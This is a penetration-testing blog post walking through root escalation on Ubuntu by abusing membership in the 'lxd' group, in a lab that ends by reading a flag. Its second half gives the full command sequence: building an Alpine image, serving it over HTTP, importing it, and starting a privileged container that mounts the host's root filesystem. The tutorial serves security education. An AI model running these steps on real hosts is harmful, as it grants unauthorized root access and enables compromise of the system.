---
title: 'Lxd Privilege Escalation'
date: 2019-10-12T15:58:00+01:00
draft: false
---

In this post we are going to describes how an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD.

A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.

LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.

One of them is to use the LXD API to mount the host’s root filesystem into a container which is going to use in this post. This gives a low-privilege user root access to the host filesystem. 

### **Table of Content**

*   Introduction to LXD and LXC
*   Container Technology
*   LXD Installation and Configuration
*   LXD Installation and Configuration

**Introduction to LXD and LXC**

**Linux Container (LXC)** are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.

**Linux daemon (LXD)** is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.

### **Container Technology**

Container technology comes from the container, is a procedure to assemble an application so that it can be run, with its requirements, in isolation from other processes container applications with names like Docker and Apache Mesos ‘ popular choices have been introduced by major public cloud vendors including Amazon Web Services, Microsoft Azure and Google Cloud Platforms.

![](https://i2.wp.com/1.bp.blogspot.com/-_CB2pZPg8m0/XaHYIWKJAHI/AAAAAAAAg5U/yGRt4Ph86BInmKTHukRJiqCayDgo0_D3ACLcBGAsYHQ/s1600/0.png?w=687&ssl=1)

**Requirement**

**Host machine:** ubuntu 18:04

**Attacker machine:** Kali Linux or any other Machine

Let’s Begin !!

So here you can observe that we have a profile for user “raj” as a local user account on the host machine.

![](https://i2.wp.com/1.bp.blogspot.com/-gqZpTNWOKoY/XaHYIeI118I/AAAAAAAAg5Y/5sYQnwNi_UQ0W4_biLFXCuTzyh2cmg3zwCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

### **LXD Installation and Configuration**

Now install lxd by executing the following command:

```
apt install lxd
```

![](https://i1.wp.com/1.bp.blogspot.com/-8xqDM4zgh60/XaHYJw5CcOI/AAAAAAAAg5o/Mw7JS79TxEoprjk8_WQ774y4lh--aKCkgCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

Also, you need to install some dependency for lxd:

```
apt install zfsutils-linux
```

![](https://i1.wp.com/1.bp.blogspot.com/-Hm2iDy3Lrc8/XaHYKImHgaI/AAAAAAAAg5s/yC3PrgSjsnkrUmbAqHf35luzl0StI5RqwCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

Now to add a profile for user: raj into the lxd group, type following command:

```
usermod --append --groups lxd raj
```

![](https://i1.wp.com/1.bp.blogspot.com/-DG5zwx0290E/XaHYKYPDVhI/AAAAAAAAg5w/qdf8vSLM_ywLF6Ojf9Yz25SRG5R7O6cJQCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

So now you can observe user “raj” is part of lxd groups.

![](https://i1.wp.com/1.bp.blogspot.com/-48IdqKYfn4Q/XaHYKnJvarI/AAAAAAAAg50/bU6OquLIG3oWQtrxSqmVYsAJCILMRIQFgCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

Now you can configure LXD and start the LXD initialization process with the **lxd init** command. During initialization it will ask for choosing some option, here majorly we have gone with DEFAULT options. But for the storage backend, we have choose “**dir**” instead of zfs.

![](https://i2.wp.com/1.bp.blogspot.com/-WVtEJzcKxDE/XaHYLDltwHI/AAAAAAAAg54/HVW3TglLpawogYL3F6imODqfONx4XQymQCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

Once you have configured the lxd then you can create a container using lxc. Here we are creating a container for “ubuntu:18.04” and named as “intimate-seasnail”. Further use lxc list command to view the available installed containers.

```
lxc launch ubuntu:18.04  
lxc list
```

Connect to the container withthe help of lxc exec command, which takes the name of the container and the commands to execute:

```
lxc exec intimate-seasnail -- /bin/bash
```

Once your are inside the container, the shell prompt will look like as following below.

![](https://i0.wp.com/1.bp.blogspot.com/-pvpyW_ncd24/XaHYLELxVEI/AAAAAAAAg58/r4pwHijSEl0ZDaZ5SGaLagqmv7NiuQthwCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

### **Privilege Escalation**

Privilege escalation through lxd requires the access of local account, therefore, we choose SSH to connect and take the access local account on host machine.

_Note: the most important condition is that the user should be a member of lxd group._

```
ssh raj@192.168.1.105
```

![](https://i1.wp.com/1.bp.blogspot.com/-jyRKVNcGy3E/XaHYLb3nFXI/AAAAAAAAg6A/JfkG7FazSLYvQDZPepJw35U9l0T5SfGwQCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

In order to take escalate the root privilege of the host machine you have to create an image for lxd thus you need to perform the following the action:

1.  **Steps to be performed on the attacker machine**:

*   Download build-alpine in your local machine through the git repository.
*   Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
*   Transfer the tar file to the host machine

2.  **Steps to be performed on the host machine:**

*   Download the alpine image
*   Import image for lxd
*   Initialize the image inside a new container.
*   Mount the container inside the /root directory

So, we downloaded the build alpine using the GitHub repose.

```
git clone  https://github.com/saghul/lxd-alpine-builder.git  
cd lxd-alpine-builder  
./build-alpine
```

![](https://i0.wp.com/1.bp.blogspot.com/-Pq2pI1v8leE/XaHYL9-edOI/AAAAAAAAg6E/T9bKB2fY8dUYd8eJFVLpv3-UPMxcmcRVACLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

On running the above command, a tar.gz file is created in the working directory that we have transferred to the host machine.

```
python -m SimpleHTTPServer
```

![](https://i1.wp.com/1.bp.blogspot.com/-QJY3OdT2k8w/XaHYISYrQ-I/AAAAAAAAg5c/oYFVSoQB_w0DbfvddZirjoirtsUm112_QCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

On another hand we will download the alpine-image inside /tmp directory on the host machine.

```
cd /tmp  
wget http://192.168.1.107:8000/apline-v3.10-x86\_64-20191008\_1227.tar.gz
```

After the image is built it can be added as an image to LXD as follows:

```
lxc image import ./apline-v3.10-x86\_64-20191008\_1227.tar.gz --alias myimage
```

use the list command to check the list of images

```
lxc image list
```

![](https://i1.wp.com/1.bp.blogspot.com/-yy1afthCNsc/XaHYJSIM37I/AAAAAAAAg5g/KTDuZuVIjmMzqEzlMsNY0E59r7UDV28tACLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

```
lxc init myimage ignite -c security.privileged=true  
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
lxc start ignite  
lxc exec ignite /bin/sh  
id
```

Once inside the container, navigate to /mnt/root to see all resources from the host machine.

After running the bash file. We see that we have a different shell, it is the shell of the container. This container has all the files of the host machine. So, we enumerated for the flag and found it.

```
mnt/root/root  
ls  
flag.txt  
cat flag.txt
```

![](https://i0.wp.com/1.bp.blogspot.com/-Anb2MgTn7oM/XaHYJib3nnI/AAAAAAAAg5k/vazX4tfy3OEJLQ8EZ-o-1LEWvOpD4_vHwCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

**Source:** https://ift.tt/2VBG2hr

**Author**: Kavish Tyagi is a Cybersecurity enthusiast and Researcher in the field of WebApp Penetration testing. Contact [**here**](https://www.linkedin.com/in/kavish-tyagi-844239125/)

The post [Lxd Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/2peYsZg